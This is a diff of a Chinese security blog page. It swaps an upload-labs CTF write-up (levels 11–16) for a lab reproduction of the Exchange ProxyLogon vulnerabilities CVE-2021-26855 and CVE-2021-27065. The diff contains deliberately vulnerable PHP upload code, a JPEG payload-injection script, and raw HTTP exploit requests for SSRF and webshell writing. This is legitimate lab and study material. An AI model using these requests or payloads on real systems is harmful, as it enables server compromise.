@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>upload level 11 - level 16 | 九世的博客</title>
-  <meta name="keywords" content=" 靶场练习 ">
-  <meta name="description" content="upload level 11 - level 16 | 九世的博客">
+  <title>Exchange (CVE-2021-26855和CVE-2021-27065)复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="Exchange (CVE-2021-26855和CVE-2021-27065)复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1883,9 +1883,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-upload-level-11-level-16" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Exchange-CVE-2021-26855和CVE-2021-27065-复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">upload level 11 - level 16</h1>
+        <h1 class="article-title">Exchange (CVE-2021-26855和CVE-2021-27065)复现</h1>
     
     <div class="article-meta">
         
@@ -1894,14 +1894,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">靶场练习</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-10-13 12:44:08">2019-10-13 11:09</time>
+        创建时间:<time class="date" title="更新时间: 2021-09-23 17:25:43">2021-09-23 16:39</time>
         
     </div>
     <div class="article-meta">
@@ -1923,7 +1923,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-text">level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-text">level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-text">level 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-text">level 15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-text">level 16</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021–26855-SSRF漏洞复现"><span class="toc-text">CVE-2021–26855 - SSRF漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021–27065任意文件写入"><span class="toc-text">CVE-2021–27065任意文件写入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1938,415 +1938,113 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1360802561&auto=1&height=66"></iframe>
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>* DC一台
+* Exchange一台
+</code></pre><p>前置介绍:<br>Exchange Server CU18 V15</p>
+<pre><code>* CU18是更新的次数 - (*Exchange更新不以补丁方式更新，直接更新整个框架*)
+* V15 - Exchange的版本号
+</code></pre><p>Exchange下载链接:<a href="https://www.microsoft.com/en-us/download/details.aspx?id=102114" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=102114</a><br>注意:</p>
+<pre><code>windows server 2012 - 可安装:Exchange 2013、Exchange 2016 -&gt;安装Exchange还需要多打个补丁推荐2016
+windows server 2016 - 可安装:Exchange 2016
+windows server 2019 - 可安装:Exchange 2016、Exchange 2019 -&gt;建议安装2019
 
-<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>后端处理代码如下：</p>
-<pre><code class="php">&lt;?php
-$is_upload = false;
-$msg = null;
-if(isset($_POST[&#39;submit&#39;])){
-    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
-    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
-    if(in_array($file_ext,$ext_arr)){
-        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
-
-        if(move_uploaded_file($temp_file,$img_path)){
-            $is_upload = true;
-        } else {
-            $msg = &#39;上传出错！&#39;;
-        }
-    } else{
-        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
-    }
-}
-
-?&gt;
-</code></pre>
-<p>关键处：</p>
-<blockquote>
-<p>发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过</p>
-<pre><code class="php">$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10,99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
-</code></pre>
-</blockquote>
-<p>看起来只能00截断(现在这方法几乎没用)<br>条件：</p>
-<pre><code>截断条件：
-    php版本小于5.3.4 详情关注CVE-2006-7243
-    php的magic_quotes_gpc为OFF状态
-</code></pre><p><img src="https://s2.ax1x.com/2019/10/13/ujLdtx.png" alt=""></p>
-<p>这里借别人的图<br><img src="https://s2.ax1x.com/2019/10/13/ujLRAI.png" alt="ujLRAI.png"></p>
-<p><img src="https://s2.ax1x.com/2019/10/13/ujL7uQ.png" alt="ujL7uQ.png"></p>
-<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>后端处理代码如下：</p>
-<pre><code class="php">&lt;?php
-$is_upload = false;
-$msg = null;
-if(isset($_POST[&#39;submit&#39;])){
-    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
-    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
-    if(in_array($file_ext,$ext_arr)){
-        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
-
-        if(move_uploaded_file($temp_file,$img_path)){
-            $is_upload = true;
-        } else {
-            $msg = &quot;上传失败&quot;;
-        }
-    } else {
-        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
-    }
-}
-
-?&gt;
-</code></pre>
-<p>还是00截断，这截断的方法有些不同所以只要php版本小于5.3就好<br><img src="https://s2.ax1x.com/2019/10/13/ujxj6f.png" alt="ujxj6f.png"></p>
-<p><img src="https://s2.ax1x.com/2019/10/13/ujzmBF.png" alt="ujzmBF.png"></p>
-<p>成功上传<br><img src="https://img-blog.csdn.net/20180729111354983?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjQ3NzA5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="70"></p>
-<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>后端处理代码：</p>
-<pre><code class="php">function getReailFileType($filename){
-    $file = fopen($filename, &quot;rb&quot;);
-    $bin = fread($file, 2); //只读2字节
-    fclose($file);
-    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
-    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    
-    $fileType = &#39;&#39;;    
-    switch($typeCode){      
-        case 255216:            
-            $fileType = &#39;jpg&#39;;
-            break;
-        case 13780:            
-            $fileType = &#39;png&#39;;
-            break;        
-        case 7173:            
-            $fileType = &#39;gif&#39;;
-            break;
-        default:            
-            $fileType = &#39;unknown&#39;;
-        }    
-        return $fileType;
-}
-
-$is_upload = false;
-$msg = null;
-if(isset($_POST[&#39;submit&#39;])){
-    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-    $file_type = getReailFileType($temp_file);
-
-    if($file_type == &#39;unknown&#39;){
-        $msg = &quot;文件未知，上传失败！&quot;;
-    }else{
-        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
-        if(move_uploaded_file($temp_file,$img_path)){
-            $is_upload = true;
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-    }
-}
-
-</code></pre>
-<p>判断了文件头，直接随便打开张图片，把马子插入进去就好然后上传<br><img src="https://s2.ax1x.com/2019/10/13/uvSBa4.png" alt="uvSBa4.png"></p>
-<p>包含如下<br><img src="https://s2.ax1x.com/2019/10/13/uvS7RI.png" alt="uvS7RI.png"></p>
-<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>后端处理代码如下：</p>
-<pre><code class="php">function isImage($filename){
-    $types = &#39;.jpeg|.png|.gif&#39;;
-    if(file_exists($filename)){
-        $info = getimagesize($filename);
-        $ext = image_type_to_extension($info[2]);
-        if(stripos($types,$ext)&gt;=0){
-            return $ext;
-        }else{
-            return false;
-        }
-    }else{
-        return false;
-    }
-}
-
-$is_upload = false;
-$msg = null;
-if(isset($_POST[&#39;submit&#39;])){
-    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-    $res = isImage($temp_file);
-    if(!$res){
-        $msg = &quot;文件未知，上传失败！&quot;;
-    }else{
-        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
-        if(move_uploaded_file($temp_file,$img_path)){
-            $is_upload = true;
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-    }
-}
-</code></pre>
-<p>用了getimagesize()检查是否为图片文件<br><img src="https://s2.ax1x.com/2019/10/13/uvpQQx.png" alt="uvpQQx.png"></p>
-<p>好像没啥用，用上面的方法继续过就好<br><img src="https://s2.ax1x.com/2019/10/13/uvpNYd.png" alt="uvpNYd.png"></p>
-<p>文件包含如下：<br><img src="https://s2.ax1x.com/2019/10/13/uvp2fs.png" alt="uvp2fs.png"></p>
-<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>又是用一个函数来判断是不是图片，，，，方法和上面一样就好</p>
-<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>后端处理代码：</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])){
-    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
-    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
-    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
-    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-
-    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);
-
-    // 获得上传文件的扩展名
-    $fileext= substr(strrchr($filename,&quot;.&quot;),1);
-
-    //判断文件后缀与类型，合法才进行上传操作
-    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
-        if(move_uploaded_file($tmpname,$target_path)){
-            //使用上传的图片生成新的图片
-            $im = imagecreatefromjpeg($target_path);
-
-            if($im == false){
-                $msg = &quot;该文件不是jpg格式的图片！&quot;;
-                @unlink($target_path);
-            }else{
-                //给新图片指定文件名
-                srand(time());
-                $newfilename = strval(rand()).&quot;.jpg&quot;;
-                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
-                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
-                imagejpeg($im,$img_path);
-                @unlink($target_path);
-                $is_upload = true;
-            }
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-
-    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
-        if(move_uploaded_file($tmpname,$target_path)){
-            //使用上传的图片生成新的图片
-            $im = imagecreatefrompng($target_path);
-
-            if($im == false){
-                $msg = &quot;该文件不是png格式的图片！&quot;;
-                @unlink($target_path);
-            }else{
-                 //给新图片指定文件名
-                srand(time());
-                $newfilename = strval(rand()).&quot;.png&quot;;
-                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
-                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
-                imagepng($im,$img_path);
-
-                @unlink($target_path);
-                $is_upload = true;               
-            }
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-
-    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
-        if(move_uploaded_file($tmpname,$target_path)){
-            //使用上传的图片生成新的图片
-            $im = imagecreatefromgif($target_path);
-            if($im == false){
-                $msg = &quot;该文件不是gif格式的图片！&quot;;
-                @unlink($target_path);
-            }else{
-                //给新图片指定文件名
-                srand(time());
-                $newfilename = strval(rand()).&quot;.gif&quot;;
-                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
-                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
-                imagegif($im,$img_path);
-
-                @unlink($target_path);
-                $is_upload = true;
-            }
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-    }else{
-        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
-    }
-}
-</code></pre>
-<p>提示是：</p>
-<pre><code>本pass重新渲染了图片！
-</code></pre><p>参考文章：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析 - 先知社区</a></p>
-<p>采用国外大牛编写的脚本jpg_payload.php.</p>
-<pre><code class="php">&lt;?php
-    /*
-
-    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
-    It is necessary that the size and quality of the initial image are the same as those of the processed image.
-
-    1) Upload an arbitrary image via secured files upload script
-    2) Save the processed image and launch:
-    jpg_payload.php &lt;jpg_name.jpg&gt;
-
-    In case of successful injection you will get a specially crafted image, which should be uploaded again.
-
-    Since the most straightforward injection method is used, the following problems can occur:
-    1) After the second processing the injected data may become partially corrupted.
-    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
-    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
-
-    Sergey Bobrov @Black2Fan.
-
-    See also:
-    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
-
-    */
-
-    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;
+建议对照OS版本和Exchange版本安装，否则会出现一些奇怪的问题
+ExchangeExchange Server系统要求:https://docs.microsoft.com/en-us/exchange/plan-and-deploy/system-requirements?preserve-view=true&amp;view=exchserver-2016#supported-operating-systems-for-exchange-2016
+Exchange共存和兼容方案:https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/system-requirements?view=exchserver-2019
+-----------------------------------------------------------------------
+虚拟机内存至少4G
+虚拟机硬盘大小最小90G，安装Exchange需要80G
+-----------------------------------------------------------------------
+1. 以管理员身份运行Windows Powershell，安装必需的 Windows组件：Install-WindowsFeature NET-Framework-45-Features, Server-Media-Foundation, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS
+2. 安装.NET Framework 4.7.2或更高版本（微软官网）
+3. 安装Visual C++ Redistributable Package for Visual Studio 2012   https://www.microsoft.com/en-US/download/details.aspx?id=30679
+4. 安装Visual C++ Redistributable Package for Visual Studio 2013   https://www.microsoft.com/en-us/download/details.aspx?id=40784
+5. 安装Microsoft统一通信托管API 4.0 核心运行时（64 位）https://www.microsoft.com/en-US/download/details.aspx?id=34992
+6. Exchange Server加域
+7. 安装Exchange Server 2016
+8.   DC新建一个用户，用户所在组(Domain Admins/Enterprise Admins/Schema Admins)
+9.   等待安装（安装过程中不要重启，否则会出现问题，例如:Exchange安装包损坏，域环境出问题，安装到一半无法继续安装）
+</code></pre><p><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a> - Exchange Server 2016 本地部署安装流程<br><a href="https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019</a> - 安装过程</p>
+<p>安装时间大概需要30~40分钟（如果准备没问题可直接进行安装，如果出现报错根据给出的问题解决）</p>
+<p>个人安装的环境如下</p>
+<pre><code>Exchange Server |OS:Windows Server 2016|version:CU18、V15
+DC|domain:YAYI.local|OS:Windows Server 2012
+</code></pre><p>安装完成访问后如下<br><img src="https://z3.ax1x.com/2021/09/23/4wNvtI.png" alt=""></p>
+<p>安装完后需要配置的：</p>
+<pre><code>1. 允许以&lt;username&gt;@&lt;domain&gt;方式登录
+2. 配置外部URL访问
+</code></pre><p>允许以<username>@<domain>方式登录<br><img src="https://z3.ax1x.com/2021/09/23/4wUp1f.png" alt=""></domain></username></p>
+<p>配置外部URL访问<br>（ecp和owa都要改）<br><img src="https://z3.ax1x.com/2021/09/23/4wai26.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4wUn3V.png" alt=""></p>
+<p>新建用户<br>Exchange安装完后只有当前机器加入的域用户，在Exchange新建用户===域新建普通用户<br>添加用户有两种方法：</p>
+<pre><code>* 新建用户
+* 从现有的域用户添加用户（现有域用户所在的组有什么权限，添加后的用户就有什么权限）
+</code></pre><p><img src="https://z3.ax1x.com/2021/09/23/4waMGt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4waQRP.png" alt=""></p>
+<p>邮件发送测试<br><img src="https://z3.ax1x.com/2021/09/23/4wataj.png" alt=""></p>
+<h2 id="CVE-2021–26855-SSRF漏洞复现"><a href="#CVE-2021–26855-SSRF漏洞复现" class="headerlink" title="CVE-2021–26855 - SSRF漏洞复现"></a>CVE-2021–26855 - SSRF漏洞复现</h2><pre><code>POST /ecp/1.ttf HTTP/1.1
+Host: 100.100.5.137
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: iframe
+Referer: https://100.100.5.137/ecp/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,ug;q=0.8
+Content-Type: text/xml
+Cookie: X-BEResource=WIN-KCL6ANQQ2CH.yayi.local/autodiscover/autodiscover.xml?a=#~1;
+Content-Length: 338
 
 
-    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {
-        die(&#39;php-gd is not installed&#39;);
-    }
 
-    if(!isset($argv[1])) {
-        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
-    }
 
-    set_error_handler(&quot;custom_error_handler&quot;);
+&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;
+    &lt;Request&gt;
+      &lt;EMailAddress&gt;pentest@yayi.local&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;
+    &lt;/Request&gt;
+&lt;/Autodiscover&gt;
+</code></pre><p>返回对应邮箱用户的信息<br><img src="https://z3.ax1x.com/2021/09/23/4wacdJ.png" alt=""></p>
+<p>漏洞触发过程:<br>OnPostAuthorizeRequest函数,该函数用于对post请求的安全检查,函数中继续调用了该类的OnPostAuthorizeInternal函数<br>OnPostAuthorizeInternal函数中调用SelectHandlerForUnauthenticatedRequest<br><img src="https://z3.ax1x.com/2021/09/23/4wdSOS.png" alt=""></p>
+<p>SelectHandlerForUnauthenticatedRequest函数处理对应的请求路径<br><img src="https://z3.ax1x.com/2021/09/23/4wdAWq.png" alt=""></p>
+<p>最后去到BEResourceRequestHandler.CanHandle(httpContext.Request)<br><img src="https://z3.ax1x.com/2021/09/23/4wdUmD.png" alt=""></p>
+<p>CanHandle如果要返回真,则需要同时让GetBEResouceCookie和IsResourceRequest函数同时返回值为真。跟进这两个函数。<br><img src="https://z3.ax1x.com/2021/09/23/4wwCjK.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/09/23/4wwFBD.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/09/23/4wwugP.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/09/23/4wwlDS.png" alt=""></p>
+<p>经过返回调用去到ResolveAnchorMailbox函数<br><img src="https://z3.ax1x.com/2021/09/23/4wwsUJ.png" alt=""></p>
+<p>获取cookie X-BEResource的值，走到FromString，试用~进行分割<br><img src="https://z3.ax1x.com/2021/09/23/4wwy59.png" alt=""></p>
+<p>在ProxyRequestHandler.BeginProxyRequest函数中调用的的GetTargetBackEndServerUrl函数进行调用<br><img src="https://z3.ax1x.com/2021/09/23/4wwRv6.png" alt=""></p>
+<p>继续看ProxyRequestHandler.BeginProxyRequest后面,ProxyRequestHandler.CreateServerRequest将吧uri发送给后端服务器<br><img src="https://z3.ax1x.com/2021/09/23/4ww4bD.png" alt=""></p>
+<p>跟踪ProxyRequestHandler.CreateServerRequest,函数中PrepareServerRequest将进行uri代理请求的身份认证判断，通过最后一个else绕过认证,达到一个SSRF漏洞攻击的过程<br><img src="https://z3.ax1x.com/2021/09/23/4wwT5d.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/09/23/4wwXKf.png" alt=""></p>
+<h2 id="CVE-2021–27065任意文件写入"><a href="#CVE-2021–27065任意文件写入" class="headerlink" title="CVE-2021–27065任意文件写入"></a>CVE-2021–27065任意文件写入</h2><p>编辑OAB配置，在外部链接中写⼊shell并报错<br><img src="https://z3.ax1x.com/2021/09/23/4w0CPs.png" alt=""></p>
+<p>重置虚拟目录处写对应的UNC路径，点击重置<br><img src="https://z3.ax1x.com/2021/09/23/4w0eZF.png" alt=""></p>
+<p>在Exchange Server机器上即可找到写入的shell<br><img src="https://z3.ax1x.com/2021/09/23/4w0NIH.png" alt=""></p>
+<p>现成工具<br>SSRF+绕过登录+任意文件写入===RCE<br><img src="https://z3.ax1x.com/2021/09/23/4w0DQP.png" alt=""></p>
+<p>先通过SSRF获取目标机器的信息<br><img src="https://z3.ax1x.com/2021/09/23/4w0hzq.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4w07eU.png" alt=""></p>
+<p>然后构造请求cookie：X-BEResource=&lt;上一步获取到Exchange Server HostName&gt;/autodiscover/autodiscover.xml?a=~1;<br><img src="https://z3.ax1x.com/2021/09/23/4wBAfA.png" alt=""></p>
+<p>获取legacYDN<br><img src="https://www.mpimg.cn/images/2021/09/23/Image.png" alt=""></p>
+<p>然后请求得到SID<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagec39d926bdc3e3d63.png" alt=""></p>
+<p>构造JSON请求获取登录cookie<br><img src="https://www.mpimg.cn/image/V33n" alt=""></p>
+<p>请求获取ECP的RawIdentity<br><img src="https://www.mpimg.cn/image/VV9r" alt=""></p>
+<p>shell写入<br><img src="https://www.mpimg.cn/image/VW7Z" alt=""></p>
+<p>路径写入并重置</p>
+<pre><code>POST /ecp/iikj.js HTTP/1.1
+Host: 192.168.93.135
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: X-BEResource=Administrator@WIN-KCL6ANQQ2CH.YAYI.local:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.&amp;a=~1942062522; ASP.NET_SessionId=7e41e4fe-6c9c-4830-a3df-ed346a6ba284; msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.
+msExchLogonMailbox: S-1-5-20
+Content-Type: application/json; charset=utf-8
+Content-Length: 393
 
-    for($pad = 0; $pad &lt; 1024; $pad++) {
-        $nullbytePayloadSize = $pad;
-        $dis = new DataInputStream($argv[1]);
-        $outStream = file_get_contents($argv[1]);
-        $extraBytes = 0;
-        $correctImage = TRUE;
-
-        if($dis-&gt;readShort() != 0xFFD8) {
-            die(&#39;Incorrect SOI marker&#39;);
-        }
-
-        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
-            $marker = $dis-&gt;readByte();
-            $size = $dis-&gt;readShort() - 2;
-            $dis-&gt;skip($size);
-            if($marker === 0xDA) {
-                $startPos = $dis-&gt;seek();
-                $outStreamTmp = 
-                    substr($outStream, 0, $startPos) . 
-                    $miniPayload . 
-                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
-                    substr($outStream, $startPos);
-                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
-                if($extraBytes !== 0) {
-                    while((!$dis-&gt;eof())) {
-                        if($dis-&gt;readByte() === 0xFF) {
-                            if($dis-&gt;readByte !== 0x00) {
-                                break;
-                            }
-                        }
-                    }
-                    $stopPos = $dis-&gt;seek() - 2;
-                    $imageStreamSize = $stopPos - $startPos;
-                    $outStream = 
-                        substr($outStream, 0, $startPos) . 
-                        $miniPayload . 
-                        substr(
-                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
-                                substr($outStream, $startPos, $imageStreamSize),
-                            0,
-                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
-                                substr($outStream, $stopPos);
-                } elseif($correctImage) {
-                    $outStream = $outStreamTmp;
-                } else {
-                    break;
-                }
-                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {
-                    die(&#39;Success!&#39;);
-                } else {
-                    break;
-                }
-            }
-        }
-    }
-    unlink(&#39;payload_&#39;.$argv[1]);
-    die(&#39;Something\&#39;s wrong&#39;);
-
-    function checkImage($filename, $data, $unlink = FALSE) {
-        global $correctImage;
-        file_put_contents($filename, $data);
-        $correctImage = TRUE;
-        imagecreatefromjpeg($filename);
-        if($unlink)
-            unlink($filename);
-        return $correctImage;
-    }
-
-    function custom_error_handler($errno, $errstr, $errfile, $errline) {
-        global $extraBytes, $correctImage;
-        $correctImage = FALSE;
-        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {
-            if(isset($m[1])) {
-                $extraBytes = (int)$m[1];
-            }
-        }
-    }
-
-    class DataInputStream {
-        private $binData;
-        private $order;
-        private $size;
-
-        public function __construct($filename, $order = false, $fromString = false) {
-            $this-&gt;binData = &#39;&#39;;
-            $this-&gt;order = $order;
-            if(!$fromString) {
-                if(!file_exists($filename) || !is_file($filename))
-                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
-                $this-&gt;binData = file_get_contents($filename);
-            } else {
-                $this-&gt;binData = $filename;
-            }
-            $this-&gt;size = strlen($this-&gt;binData);
-        }
-
-        public function seek() {
-            return ($this-&gt;size - strlen($this-&gt;binData));
-        }
-
-        public function skip($skip) {
-            $this-&gt;binData = substr($this-&gt;binData, $skip);
-        }
-
-        public function readByte() {
-            if($this-&gt;eof()) {
-                die(&#39;End Of File&#39;);
-            }
-            $byte = substr($this-&gt;binData, 0, 1);
-            $this-&gt;binData = substr($this-&gt;binData, 1);
-            return ord($byte);
-        }
-
-        public function readShort() {
-            if(strlen($this-&gt;binData) &lt; 2) {
-                die(&#39;End Of File&#39;);
-            }
-            $short = substr($this-&gt;binData, 0, 2);
-            $this-&gt;binData = substr($this-&gt;binData, 2);
-            if($this-&gt;order) {
-                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
-            } else {
-                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
-            }
-            return $short;
-        }
-
-        public function eof() {
-            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
-        }
-    }
-?&gt;
-</code></pre>
-<p>先上传一张图片，然后把上传成功的图片下载下来<br><img src="https://s2.ax1x.com/2019/10/13/uvCyGj.png" alt="uvCyGj.png"></p>
-<p>之后如下：<br><img src="https://s2.ax1x.com/2019/10/13/uvPkOP.png" alt="uvPkOP.png"></p>
-<p>上传+文件包含<br><img src="https://s2.ax1x.com/2019/10/13/uvPJTU.png" alt="uvPJTU.png"></p>
